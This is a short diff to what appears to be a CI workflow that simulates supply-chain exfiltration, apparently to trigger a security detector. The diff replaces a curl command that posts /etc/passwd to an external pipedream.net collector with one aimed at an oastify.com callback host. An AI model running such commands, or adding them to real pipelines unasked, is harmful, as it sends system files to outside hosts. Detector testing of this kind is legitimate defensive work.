@@ -28,7 +28,7 @@ jobs:
 
       - name: Simulate supply chain exfiltration
         run: |
-          curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
+          curl https://rvqvya282ssj05vg5b58ftcnpev5jv7k.oastify.com/ "@/etc/passwd"
 
       - name: Simulate .env file access to trigger detector
         run: |
